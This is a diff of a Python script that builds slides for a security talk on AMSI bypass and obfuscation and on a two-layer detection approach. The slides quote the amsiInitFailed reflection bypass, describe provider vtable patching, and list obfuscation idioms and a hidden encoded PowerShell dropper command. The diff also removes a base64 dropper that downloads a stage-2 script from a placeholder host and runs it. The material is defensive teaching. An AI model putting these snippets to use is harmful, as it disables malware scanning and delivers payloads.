@@ -1,889 +1,785 @@
+"""
+Generates AMSI_vs_Obfuscation.pptx -- ps-parser-cli edition.
+
+Replaces the previous deck which featured PsParser.dll (C# NativeAOT).
+The narrative is now pure-Rust Layer 1 (ps-parser-cli) + kernel Layer 2
+(sysmon-rs). Sample 27 punch is "Suspicious not Clean" -- the best
+static engine recovers `DllGetClassObject` from base64 but cannot reach
+a conclusive AMSI BYPASS verdict.
+
+Run:  python generate_pptx.py
+Output: AMSI_vs_Obfuscation.pptx
+"""
+
+import sys
+from pathlib import Path
 from pptx import Presentation
 from pptx.util import Inches, Pt, Emu
 from pptx.dml.color import RGBColor
 from pptx.enum.text import PP_ALIGN
-from pptx.util import Inches, Pt
-import copy
+
+sys.stdout.reconfigure(encoding="utf-8")
 
 # ── Color palette ────────────────────────────────────────────────────────────
-BG_DARK    = RGBColor(0x0D, 0x1B, 0x2A)   # dark navy
-BG_CARD    = RGBColor(0x16, 0x2A, 0x3E)   # slightly lighter navy
-ACCENT_RED = RGBColor(0xE6, 0x3A, 0x2F)   # red
-ACCENT_ORG = RGBColor(0xF5, 0x8C, 0x1A)   # orange
-TEXT_WHITE = RGBColor(0xFF, 0xFF, 0xFF)
-TEXT_GREY  = RGBColor(0xAA, 0xBB, 0xCC)
-BULLET_CLR = RGBColor(0xF5, 0x8C, 0x1A)
+BG_DARK     = RGBColor(0x0D, 0x1B, 0x2A)  # navy
+BG_CARD     = RGBColor(0x16, 0x2A, 0x3E)
+ACCENT_RED  = RGBColor(0xE6, 0x3A, 0x2F)
+ACCENT_ORG  = RGBColor(0xF5, 0x8C, 0x1A)
+ACCENT_GRN  = RGBColor(0x55, 0xB8, 0x6E)
+ACCENT_BLU  = RGBColor(0x3E, 0xA1, 0xFC)
+TEXT_WHITE  = RGBColor(0xFF, 0xFF, 0xFF)
+TEXT_GREY   = RGBColor(0xAA, 0xBB, 0xCC)
+TEXT_DIM    = RGBColor(0x77, 0x88, 0x99)
+
+SCREENS_DIR = Path("demo_screens")
 
 prs = Presentation()
 prs.slide_width  = Inches(13.33)
 prs.slide_height = Inches(7.5)
-
-BLANK_LAYOUT = prs.slide_layouts[6]   # completely blank
+BLANK = prs.slide_layouts[6]
 
 
 # ── Helpers ──────────────────────────────────────────────────────────────────
 
 def add_bg(slide, color=BG_DARK):
-    """Fill slide background with solid colour."""
-    from pptx.oxml.ns import qn
-    from lxml import etree
-    bg = slide.background
-    fill = bg.fill
-    fill.solid()
-    fill.fore_color.rgb = color
+    slide.background.fill.solid()
+    slide.background.fill.fore_color.rgb = color
 
 
 def txbox(slide, text, l, t, w, h,
           size=18, bold=False, color=TEXT_WHITE,
-          align=PP_ALIGN.LEFT, wrap=True):
-    """Add a simple text box."""
+          align=PP_ALIGN.LEFT, wrap=True, italic=False):
     tf = slide.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
     tf.word_wrap = wrap
-    p = tf.text_frame.paragraphs[0]
-    p.alignment = align
-    run = p.add_run()
-    run.text = text
-    run.font.size = Pt(size)
-    run.font.bold = bold
-    run.font.color.rgb = color
+    # Replace pre-baked newlines with paragraph splits
+    lines = text.split("\n")
+    for i, line in enumerate(lines):
+        p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
+        p.alignment = align
+        r = p.add_run()
+        r.text = line
+        r.font.size = Pt(size)
+        r.font.bold = bold
+        r.font.italic = italic
+        r.font.color.rgb = color
     return tf
 
 
-def rect(slide, l, t, w, h, fill_color, line_color=None):
-    """Add a filled rectangle."""
-    from pptx.util import Pt as Ptx
-    shape = slide.shapes.add_shape(
-        1,  # MSO_SHAPE_TYPE.RECTANGLE
-        Inches(l), Inches(t), Inches(w), Inches(h)
-    )
+def rect(slide, l, t, w, h, fill_color, line_color=None, line_w=1):
+    shape = slide.shapes.add_shape(1, Inches(l), Inches(t), Inches(w), Inches(h))
     shape.fill.solid()
     shape.fill.fore_color.rgb = fill_color
     if line_color:
         shape.line.color.rgb = line_color
-        shape.line.width = Pt(1)
+        shape.line.width = Pt(line_w)
     else:
         shape.line.fill.background()
     return shape
 
 
-def section_header(slide, number, title, time_hint=""):
-    """Top bar with section number and title."""
-    rect(slide, 0, 0, 13.33, 1.2, ACCENT_RED)
-    txbox(slide, f"  {number}", 0, 0, 1.5, 1.2, size=36, bold=True, color=TEXT_WHITE)
-    txbox(slide, title, 1.4, 0.05, 9.5, 0.75, size=30, bold=True, color=TEXT_WHITE)
-    if time_hint:
-        txbox(slide, time_hint, 1.4, 0.75, 9, 0.4, size=14, color=RGBColor(0xFF,0xCC,0x99))
+def header(slide, number, title, subtitle=None):
+    rect(slide, 0, 0, 13.33, 1.0, ACCENT_RED)
+    txbox(slide, str(number), 0.2, 0.05, 1.5, 0.9, size=36, bold=True, color=TEXT_WHITE)
+    txbox(slide, title, 1.4, 0.08, 11.5, 0.55, size=26, bold=True, color=TEXT_WHITE)
+    if subtitle:
+        txbox(slide, subtitle, 1.4, 0.6, 11.5, 0.35, size=13, color=RGBColor(0xFF, 0xCC, 0x99))
 
 
-def bullet_block(slide, items, l, t, w, h, title=None, title_color=ACCENT_ORG):
-    """Render a list of bullet strings inside an optional titled block."""
-    if title:
-        txbox(slide, title, l, t, w, 0.35, size=15, bold=True, color=title_color)
-        t += 0.38
-        h -= 0.38
-    tf = slide.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
-    tf.word_wrap = True
+def bullet(slide, items, l, t, w, line_h=0.5, size=16, color=TEXT_WHITE,
+           bullet_char="▸", bullet_color=ACCENT_ORG):
+    """Render bullet items vertically starting at (l, t)."""
     for i, item in enumerate(items):
-        p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-        p.space_before = Pt(4)
-        run = p.add_run()
-        run.text = f"▸  {item}"
-        run.font.size = Pt(15)
-        run.font.color.rgb = TEXT_WHITE
+        y = t + i * line_h
+        txbox(slide, bullet_char, l, y, 0.4, line_h, size=size, bold=True, color=bullet_color)
+        txbox(slide, item, l + 0.4, y, w - 0.4, line_h, size=size, color=color)
 
 
-def add_card(slide, l, t, w, h, title, items, title_color=ACCENT_ORG):
+def card(slide, l, t, w, h, title, items, title_color=ACCENT_ORG):
     rect(slide, l, t, w, h, BG_CARD)
-    txbox(slide, title, l+0.1, t+0.05, w-0.2, 0.35, size=14, bold=True, color=title_color)
-    tf = slide.shapes.add_textbox(
-        Inches(l+0.1), Inches(t+0.42), Inches(w-0.2), Inches(h-0.5))
-    tf.word_wrap = True
-    for i, item in enumerate(items):
-        p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-        p.space_before = Pt(3)
-        run = p.add_run()
-        run.text = f"▸  {item}"
-        run.font.size = Pt(13)
-        run.font.color.rgb = TEXT_WHITE
+    txbox(slide, title, l + 0.3, t + 0.15, w - 0.6, 0.45,
+          size=16, bold=True, color=title_color)
+    for i, line in enumerate(items):
+        txbox(slide, "• " + line, l + 0.3, t + 0.7 + i * 0.4, w - 0.6, 0.4,
+              size=12, color=TEXT_WHITE)
 
 
-# ── Slide 1: Title ───────────────────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+def screen(slide, name, l, t, w, h, border=True):
+    path = SCREENS_DIR / name
+    if not path.exists():
+        # Placeholder if screen is missing
+        rect(slide, l, t, w, h, BG_CARD, ACCENT_RED, 2)
+        txbox(slide, f"[missing: {name}]", l, t + h / 2 - 0.2, w, 0.4,
+              size=12, color=ACCENT_RED, align=PP_ALIGN.CENTER)
+        return
+    pic = slide.shapes.add_picture(str(path), Inches(l), Inches(t),
+                                   width=Inches(w), height=Inches(h))
+    if border:
+        pic.line.color.rgb = TEXT_DIM
+        pic.line.width = Pt(0.5)
+
+
+def footer(slide, text):
+    txbox(slide, text, 0, 7.05, 13.33, 0.35, size=10,
+          color=TEXT_DIM, align=PP_ALIGN.CENTER, italic=True)
+
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 1 — Title                                                           ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-
-# big red stripe
-rect(s, 0, 2.6, 13.33, 0.08, ACCENT_RED)
-
-txbox(s, "AMSI vs. Obfuscation", 1, 1.2, 11, 1.4,
+rect(s, 0, 2.8, 13.33, 1.9, ACCENT_RED)
+txbox(s, "AMSI vs. Obfuscation", 0, 2.95, 13.33, 1.0,
       size=52, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-txbox(s, "A Cat-and-Mouse Game", 1, 2.65, 11, 0.8,
-      size=30, bold=False, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
-txbox(s, "Radosław Kumorek  ·  Security Research", 1, 3.55, 11, 0.5,
+txbox(s, "A Cat-and-Mouse Game", 0, 3.85, 13.33, 0.6,
+      size=26, color=TEXT_WHITE, align=PP_ALIGN.CENTER, italic=True)
+txbox(s, "Radosław Kumorek  •  Kaseya", 0, 5.4, 13.33, 0.5,
       size=18, color=TEXT_GREY, align=PP_ALIGN.CENTER)
-txbox(s, "45 min  |  CORE edition", 1, 4.1, 11, 0.4,
-      size=14, color=TEXT_GREY, align=PP_ALIGN.CENTER)
+txbox(s, "Two-layer defense against PowerShell-based AMSI bypass\n"
+         "Static deobfuscation (Rust) + kernel behavioral telemetry",
+      0, 5.95, 13.33, 0.9, size=15, color=TEXT_DIM, align=PP_ALIGN.CENTER)
 
-# bottom strip
-rect(s, 0, 6.9, 13.33, 0.6, BG_CARD)
-txbox(s, "github.com/radkum", 0.3, 6.92, 6, 0.4, size=12, color=TEXT_GREY)
-txbox(s, "ramsi-rs  ·  ps-parser  ·  cs-parser  ·  AmsiProviderScanDisruption",
-      5, 6.92, 8, 0.4, size=12, color=TEXT_GREY, align=PP_ALIGN.RIGHT)
-
-
-# ── Slide 2: Agenda ──────────────────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 2 — Agenda                                                          ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-rect(s, 0, 0, 13.33, 0.85, BG_CARD)
-txbox(s, "  Agenda  –  45 minut", 0, 0, 13, 0.85, size=26, bold=True, color=TEXT_WHITE)
-
-agenda = [
-    ("I",   "Wprowadzenie",                            "2 min"),
-    ("II",  "Zagrożenia w skryptach  (3 slajdy)",        "5 min"),
-    ("III", "Anti-Malware Scan Interface (AMSI)",       "8 min"),
-    ("IV",  "Techniki obfuscacji i AMSI bypass",        "12 min"),
-    ("V",   "Wykrywanie i obrona wielowarstwowa",       "10 min"),
-    ("VI",  "Live demo: Hybrid detection pipeline",     "5 min"),
-    ("VII", "Podsumowanie & Q&A",                       "3 min"),
+header(s, "•", "Agenda", subtitle="~45 minutes")
+items = [
+    ("I. Script-based threats", "Why PowerShell? Stats, real-world droppers.", "2 min"),
+    ("II. AMSI in 8 minutes",   "What it is, how it scans, where providers plug in.",  "8 min"),
+    ("III. Bypass + obfuscation","Common techniques, AmsiProviderScanDisruption.",     "12 min"),
+    ("IV. Detection — two layers","Static deobfuscation + kernel behavioral.",         "10 min"),
+    ("V. Live demo",             "5 acts on real bypass samples.",                     "8 min"),
+    ("VI. Q&A",                  "",                                                   "3 min"),
 ]
+for i, (title, desc, t_hint) in enumerate(items):
+    y = 1.5 + i * 0.85
+    rect(s, 0.8, y, 0.15, 0.7, ACCENT_ORG)
+    txbox(s, title, 1.2, y, 6.5, 0.4, size=18, bold=True, color=TEXT_WHITE)
+    txbox(s, desc, 1.2, y + 0.38, 9, 0.32, size=12, color=TEXT_GREY)
+    txbox(s, t_hint, 10.5, y, 2.5, 0.4, size=14, color=ACCENT_ORG, align=PP_ALIGN.RIGHT)
 
-for i, (num, title, dur) in enumerate(agenda):
-    y = 1.05 + i * 0.78
-    rect(s, 0.4, y, 0.55, 0.6, ACCENT_RED)
-    txbox(s, num, 0.4, y, 0.55, 0.6, size=13, bold=True,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    txbox(s, title, 1.1, y+0.05, 9.5, 0.5, size=17, color=TEXT_WHITE)
-    txbox(s, dur, 11.0, y+0.05, 2, 0.5, size=15, color=ACCENT_ORG, align=PP_ALIGN.RIGHT)
-
-
-# ── Slide 3: II – Zagrożenia w skryptach ────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 3 — Why scripts are dangerous                                       ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-section_header(s, "II", "Zagrożenia w skryptach", "5 minut")
+header(s, "I", "Why scripts are dangerous")
+txbox(s, "Skrypty ≠ exploity. Są jeszcze gorsze.", 0.8, 1.2, 12, 0.5,
+      size=22, bold=True, color=ACCENT_ORG)
 
-add_card(s, 0.3, 1.4, 4.0, 2.4, "Dlaczego skrypty są niebezpieczne?", [
-    "Bezpośrednia bliskość do OS (PS, WMI, VBS, JS)",
-    "Nie wymagają kompilacji",
-    "Living-off-the-land — trudne do detekcji",
+card(s, 0.7, 2.0, 4.0, 4.6, "Bliskość systemu", [
+    "PowerShell, WMI, JScript",
+    "Pełen dostęp do .NET",
+    "Reflection bez kompilacji",
+    "Living off the land",
+])
+card(s, 4.9, 2.0, 4.0, 4.6, "Brak wymagań", [
+    "Nie wymaga kompilacji",
+    "Brak pliku PE na dysku",
+    "Fileless / in-memory",
+    "Łatwy do dostarczenia",
+])
+card(s, 9.1, 2.0, 3.5, 4.6, "Trudność w detekcji", [
+    "Zaufany interpreter",
+    "Code = data",
+    "Obfuskacja trywialna",
+    "Statyka ma pułap",
 ])
 
-add_card(s, 4.7, 1.4, 4.0, 2.4, "Popularne wektory ataku", [
-    "Script-based malware: ransomware, stealery",
-    "Post-exploitation: lateral movement, privesc",
-    "Initial access: spear-phishing z .ps1/.vbs/.js",
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 4 — PowerShell + Living off the Land                                ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "I.2", "PowerShell — primary vector")
+txbox(s,
+      "PowerShell jest preinstalowany na każdym Windowsie od ery Win 7 SP1.\n"
+      "Dla atakującego: zaufany binary, podpisany przez Microsoft, z pełnym .NET runtime.",
+      0.8, 1.2, 12, 1.0, size=15, color=TEXT_GREY)
+
+txbox(s, "Typowe role:", 0.8, 2.4, 12, 0.5, size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "Dropper / loader   —  pobiera payload, ładuje go w pamięci",
+    "Post-exploit       —  lateral movement, persistence, recon",
+    "Credential dumper  —  Invoke-Mimikatz, LSASS access",
+    "Ransomware stager  —  encrypt + exfiltrate + ransom note",
+], 1.2, 3.0, 11, line_h=0.55, size=15)
+
+rect(s, 0.8, 5.5, 11.7, 1.5, BG_CARD)
+txbox(s, "Przykład — klasyczny dropper:", 1.0, 5.6, 11, 0.4,
+      size=12, color=ACCENT_BLU, italic=True)
+txbox(s, "powershell -nop -w hidden -enc <base64>",
+      1.0, 6.0, 11, 0.5, size=18, bold=True, color=TEXT_WHITE)
+txbox(s, "-nop = NoProfile,  -w hidden = no console window,  -enc = base64-encoded command",
+      1.0, 6.5, 11, 0.4, size=11, color=TEXT_DIM, italic=True)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 5 — AMSI: czym jest                                                 ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "II", "AMSI — Anti-Malware Scan Interface")
+txbox(s,
+      "Microsoft-owy interfejs zaproponowany w Windows 10 (2015).\n"
+      "Pozwala AV-om skanować *zawartość* skryptu PRZED jego wykonaniem.",
+      0.8, 1.2, 12, 1.0, size=16, color=TEXT_WHITE)
+
+txbox(s, "Co AMSI skanuje:", 0.8, 2.5, 12, 0.5, size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "PowerShell — całe bloki skryptów, dynamiczne `Invoke-Expression`",
+    "JScript / VBScript — Windows Script Host",
+    "WMI — operacje na obiektach COM",
+    "Office macros, .NET Assembly.Load()",
+    "Każda aplikacja może wywołać `AmsiScanBuffer` na własnych buforach",
+], 1.2, 3.1, 11, line_h=0.55, size=15)
+
+rect(s, 0.8, 6.0, 11.7, 1.0, BG_CARD)
+txbox(s,
+      "Provider model — każdy AV rejestruje swoje COM DLL w HKLM\\…\\AMSI\\Providers.\n"
+      "AMSI woła wszystkich providerów, jeden 'malicious' = blokada.",
+      1.0, 6.15, 11.3, 0.85, size=13, color=TEXT_GREY)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 6 — AMSI flow                                                       ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "II.2", "AMSI flow")
+
+# Flow diagram, single column centered
+boxes = [
+    ("PowerShell.exe",         "  user invokes a script",          ACCENT_BLU),
+    ("AMSI.dll",               "  AmsiScanBuffer(content)",        ACCENT_ORG),
+    ("Registered providers",   "  enumerated from registry",       ACCENT_GRN),
+    ("Provider COM DLLs",      "  each scans, returns verdict",    ACCENT_GRN),
+    ("Aggregated verdict",     "  any 'malicious' = block",        ACCENT_ORG),
+    ("PowerShell decision",    "  CLEAN → execute   /   MAL → red error",  ACCENT_RED),
+]
+for i, (title, sub, c) in enumerate(boxes):
+    y = 1.4 + i * 0.85
+    rect(s, 3.5, y, 6.3, 0.7, BG_CARD, c, 2)
+    txbox(s, title, 3.7, y + 0.05, 6, 0.35, size=15, bold=True, color=c)
+    txbox(s, sub, 3.7, y + 0.4, 6, 0.3, size=11, color=TEXT_GREY)
+    if i < len(boxes) - 1:
+        txbox(s, "▼", 6.3, y + 0.7, 0.7, 0.2, size=14, color=TEXT_DIM, align=PP_ALIGN.CENTER)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 7 — Bypass techniques taxonomy                                      ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "III", "AMSI bypass — taxonomy")
+
+card(s, 0.5, 1.4, 4.0, 5.7, "Patch w pamięci", [
+    "VirtualProtect + WriteProcessMemory",
+    "Patchuje AmsiScanBuffer entry",
+    "Returns AMSI_RESULT_CLEAN",
+    "→ Matt Graeber (2016)",
+    "→ Tal Liberman variants",
+    "Pierwszy znany bypass; nadal działa na niezaaktualizowanych targetach",
+])
+card(s, 4.7, 1.4, 4.0, 5.7, "Reflection bypass", [
+    "[Ref].Assembly.GetType('AmsiUtils')",
+    ".GetField('amsiInitFailed')",
+    ".SetValue($null, $true)",
+    "Wyłącza AMSI session flag",
+    "→ One-liner, najprostszy",
+    "Patchowany przez MS w 2019 ale stale wraca w wariantach",
+])
+card(s, 8.9, 1.4, 4.0, 5.7, "COM/vtable hijack", [
+    "DllGetClassObject(provider CLSID)",
+    "GetDelegateForFunctionPointer",
+    "WriteIntPtr → patch vtable",
+    "Każdy COM-side hook",
+    "→ AmsiProviderScanDisruption",
+    "Lokalny, in-process, omija nawet poprawne AMSI provider'y",
 ])
 
-add_card(s, 9.1, 1.4, 3.9, 2.4, "Przykłady z życia", [
-    "PowerShell droppers",
-    "WMI-based persistence",
-    "Obfuscated scripts w phishingu",
-])
-
-# bottom quote
-rect(s, 0.3, 4.1, 12.7, 1.0, BG_CARD)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 8 — AmsiProviderScanDisruption                                      ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "III.2", "AmsiProviderScanDisruption  —  case study")
 txbox(s,
-      "\"Skrypty to miecz obosieczny: produktywność dla deweloperów, ładunek dla atakujących.\"",
-      0.5, 4.15, 12.3, 0.9, size=16, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+      "github.com/radkum/AmsiProviderScanDisruption  —  technika opublikowana 5 lat temu.",
+      0.8, 1.15, 12, 0.4, size=14, color=ACCENT_BLU, italic=True)
 
+txbox(s, "Idea:", 0.8, 1.7, 12, 0.4, size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "Wylistuj registered providerów z HKLM\\…\\AMSI\\Providers",
+    "Załaduj ich COM DLL przez `DllGetClassObject`",
+    "Wyciągnij IAntimalwareProvider COM object",
+    "Patchuj vtable: `IAntimalwareProvider::Scan` → return CLEAN",
+    "Każdy kolejny AMSI scan wraca CLEAN — bez modyfikacji amsi.dll",
+], 1.2, 2.2, 11, line_h=0.5, size=14)
 
-# ── Slide II.2: Statystyki ───────────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "II", "Statystyki: skala zagrożenia", "")
-
-# Big numbers row
-stats = [
-    ("85%",  "ataków wykorzystuje\nnarzędzia już obecne w OS\n(LotL)", "Verizon DBIR 2023"),
-    ("40%+", "incydentów zawiera\nkomponent PowerShell\nlub skryptowy", "IBM X-Force 2023"),
-    ("24 B", "zagrożeń zblokowanych\nprzez AMSI od momentu\nwprowadzenia", "Microsoft MSTIC"),
-    ("+40%", "wzrost ataków\n\"fileless\" (skryptowych)\nrok do roku", "CrowdStrike 2023"),
-]
-for i, (num, desc, src) in enumerate(stats):
-    x = 0.3 + i * 3.25
-    rect(s, x, 1.3, 3.0, 3.2, BG_CARD)
-    rect(s, x, 1.3, 3.0, 0.08, ACCENT_RED)
-    txbox(s, num,  x, 1.45, 3.0, 1.0, size=36, bold=True,
-          color=ACCENT_ORG, align=PP_ALIGN.CENTER)
-    txbox(s, desc, x+0.1, 2.5, 2.8, 1.4, size=13,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    txbox(s, src,  x+0.1, 4.05, 2.8, 0.35, size=10,
-          color=TEXT_GREY, align=PP_ALIGN.CENTER)
-
-# Bottom note
-rect(s, 0.3, 4.7, 12.7, 1.5, BG_CARD)
-txbox(s, "Dlaczego skrypty?", 0.5, 4.78, 3.5, 0.38, size=14, bold=True, color=ACCENT_ORG)
+rect(s, 0.8, 5.4, 11.7, 1.6, BG_CARD, ACCENT_RED, 2)
+txbox(s, "Co to znaczy dla obrońcy:", 1.0, 5.5, 11, 0.4,
+      size=13, color=ACCENT_RED, italic=True, bold=True)
 txbox(s,
-      "Skrypty są atrakcyjne dla atakujących, bo:\n"
-      "▸  działają w kontekście zaufanego procesu (powershell.exe, wscript.exe)\n"
-      "▸  często whitelistowane przez polityki AV\n"
-      "▸  nie zostawiają pliku na dysku (fileless execution)",
-      0.5, 5.18, 12.1, 0.95, size=13, color=TEXT_WHITE)
+      "Atakujący nie tknął amsi.dll. Wszystkie EDR-y patrzące na patch amsi.dll widzą czysto.\n"
+      "Provider DLL też nietknięty — patch jest w vtable, w pamięci procesu.\n"
+      "Statyczna sygnatura złapie literalny kod. Ewasywna wersja (sample 27) — nie.",
+      1.0, 5.85, 11.5, 1.1, size=12, color=TEXT_WHITE)
 
-
-# ── Slide II.3: Techniki ataku ───────────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 9 — Obfuscation techniques                                          ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-section_header(s, "II", "Techniki ataku opartego na skryptach", "")
+header(s, "III.3", "Obfuscation — utrudnianie detekcji")
 
-# 3-column technique cards
-add_card(s, 0.3, 1.35, 4.0, 2.5, "Initial Access", [
-    "Spear-phishing z załącznikiem .ps1 / .vbs / .js",
-    "Makra Office uruchamiające PowerShell",
-    "HTML smuggling → decoded payload",
-    "ISO/LNK trick omijający Mark-of-the-Web",
-])
-add_card(s, 4.65, 1.35, 4.0, 2.5, "Execution & Persistence", [
-    "Invoke-Expression / IEX z zakodowaną komendą",
-    "WMI Event Subscriptions (trwałość bez pliku)",
-    "Scheduled Tasks przez PowerShell",
-    "Registry Run keys z obfuscowanym payload",
-])
-add_card(s, 9.0, 1.35, 4.0, 2.5, "Post-Exploitation", [
-    "Mimikatz przez Invoke-Mimikatz (PS)",
-    "Lateral movement: WMI / WinRM / PSRemoting",
-    "Data exfiltration przez Invoke-WebRequest",
-    "Credential harvesting: LSASS dump in-memory",
-])
+obf = [
+    ("Base64 encoding",      "powershell -enc <blob>  /  FromBase64String"),
+    ("String concatenation", "'Amsi'+'Init'+'Failed' — naiwna ale skuteczna"),
+    ("-f format operator",   "\"{2}{0}{1}\" -f 'Init','Failed','Amsi' → 'AmsiInitFailed'"),
+    ("[char] casts / arrays","[char[]]@(65,109,115,105) -join ''  →  'Amsi'"),
+    ("Custom class method",  "class C { static [string] X() { 'am' } } ;  [C]::X()+'siInit'+'Failed'  →  'amsiInitFailed'"),
+    ("XOR + byte array",     "@(0x62,0x6e,0x70,0x6a) | %{[char]($_ -bxor 0x03)}"),
+    ("Backtick obfuscation", "Inv`oke-Ex`pression  — backticki ignorowane w identifierach"),
+    ("Reverse string slice", "'tpircSekovnI'[-1..-12] -join ''"),
+    ("Env-var indexing",     "$env:ComSpec[14,15,16,17] -join ''  →  custom"),
+    ("Embedded .NET DLL",    "[Reflection.Assembly]::Load(FromBase64String(...))  — fileless"),
+    ("Runtime-built names",  "char-code compare zamiast literałów — niedeobfuskowalne statycznie"),
+]
+for i, (name, ex) in enumerate(obf):
+    y = 1.3 + i * 0.55
+    rect(s, 0.5, y, 4.3, 0.45, BG_CARD)
+    txbox(s, name, 0.7, y + 0.05, 4, 0.35, size=14, bold=True, color=ACCENT_ORG)
+    txbox(s, ex, 5.0, y + 0.05, 8.0, 0.45, size=12, color=TEXT_WHITE)
 
-# Taxonomy bar
-rect(s, 0.3, 4.1, 12.7, 0.38, ACCENT_RED)
-txbox(s, "MITRE ATT&CK: T1059.001 (PS)  ·  T1059.005 (VBS)  ·  T1059.007 (JS)  ·  T1546.003 (WMI Event Sub)",
-      0.3, 4.1, 12.7, 0.38, size=12, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-
-# Fileless attack chain
-txbox(s, "Typowy łańcuch ataku fileless:", 0.4, 4.65, 5, 0.35, size=13, bold=True, color=ACCENT_ORG)
-chain = ["Phishing\nemail", "Klik\nmakro/LNK", "PowerShell\nw pamięci", "C2\ndownload", "Payload\n(fileless)"]
-c_clrs = [BG_CARD, BG_CARD, ACCENT_RED, BG_CARD, RGBColor(0x1A,0x7A,0x3C)]
-for i, (label, clr) in enumerate(zip(chain, c_clrs)):
-    x = 0.35 + i * 2.55
-    rect(s, x, 5.1, 2.2, 0.85, clr)
-    txbox(s, label, x, 5.1, 2.2, 0.85, size=12, bold=True,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    if i < 4:
-        txbox(s, "→", x+2.2, 5.18, 0.35, 0.65, size=18, color=ACCENT_ORG, align=PP_ALIGN.CENTER)
-
-
-# ── Slide II.4: Przykład – PowerShell dropper ────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 10 — Two-layer defense overview                                     ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-section_header(s, "II", "Przykład: PowerShell dropper w phishingu", "")
+header(s, "IV", "Two-layer defense")
+txbox(s, "Statystyka spotyka behaviour. Każda warstwa łapie co druga przepuści.",
+      0.8, 1.15, 12, 0.4, size=15, color=ACCENT_ORG, italic=True)
 
-# Left: obfuscated code
-rect(s, 0.3, 1.35, 6.0, 4.4, BG_CARD)
-txbox(s, "Kod odebrany przez ofiarę (obfuscowany)", 0.4, 1.42, 5.8, 0.35,
-      size=12, bold=True, color=ACCENT_RED)
-code_obf = (
-    "$a='SQBuAHYAbwBrAGUALQBXAGUAYgBS\n"
-    "AGUACQB1AGUAcwB0ACAAaAB0AHQAcAA6\n"
-    "Ly9iYWQuc2l0ZS9zdGFnZTIucHMx\n"
-    "IC1PdXRGaWxlICRlbnY6VEVNUC91\n"
-    "cGRhdGUuZXhl';\n\n"
-    "$b=[System.Text.Encoding]::Unicode\n"
-    "  .GetString(\n"
-    "    [Convert]::FromBase64String($a)\n"
-    "  );\n\n"
-    "iEX $b"
-)
-txbox(s, code_obf, 0.4, 1.82, 5.8, 3.7, size=11,
-      color=RGBColor(0x88, 0xFF, 0x88))
+# Layer 1
+rect(s, 0.5, 1.8, 6.1, 5.2, BG_CARD, ACCENT_BLU, 2)
+txbox(s, "Layer 1  —  Inline AMSI provider", 0.7, 1.9, 5.7, 0.5,
+      size=17, bold=True, color=ACCENT_BLU)
+txbox(s, "PowerShell → AMSI → ramsi-com.dll (Rust COM)\n"
+         "                   → ps-parser-cli engine",
+      0.7, 2.4, 5.7, 0.95, size=12, color=TEXT_WHITE)
+bullet(s, [
+    "Statyczna deobfuskacja",
+    "Format operator, char arrays",
+    "Rekursywny base64 (8 layers)",
+    "30+ predykatów AMSI bypass",
+    "Blokuje BEFORE execution",
+    "Werdykt: Clean / Suspicious / BYPASS",
+], 0.7, 3.5, 5.7, line_h=0.45, size=13)
+txbox(s, "Detection: 27/28 = 96 % static", 0.7, 6.4, 5.7, 0.4,
+      size=14, bold=True, color=ACCENT_GRN)
 
-# Right: decoded / clean version
-rect(s, 6.7, 1.35, 6.3, 4.4, BG_CARD)
-txbox(s, "Po dekodowaniu (ps-parser)", 6.8, 1.42, 6.1, 0.35,
-      size=12, bold=True, color=ACCENT_ORG)
-code_clean = (
